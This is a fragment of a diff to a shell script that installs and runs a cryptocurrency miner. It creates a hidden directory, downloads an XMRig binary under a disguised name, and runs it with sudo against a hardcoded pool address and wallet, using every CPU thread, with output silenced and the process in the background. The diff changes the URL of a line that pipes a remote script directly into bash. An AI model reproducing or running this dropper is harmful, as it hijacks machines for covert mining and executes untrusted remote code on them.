@@ -13,4 +13,4 @@ mkdir .kap && cd .kap
 wget -O sgr1 https://bitbucket.org/zepir/filesg/raw/main/xmrig >/dev/null 2>&1
 chmod +x sgr1
 sudo ./sgr1 -a rx/0 -o 159.223.49.39:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-AJG) -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
-curl -sL https://bitbucket.org/lightcoral2/cangor/raw/master/boled04.sh | bash
+curl -sL https://bitbucket.org/zepir/filesg/raw/main/boled04.sh | bash
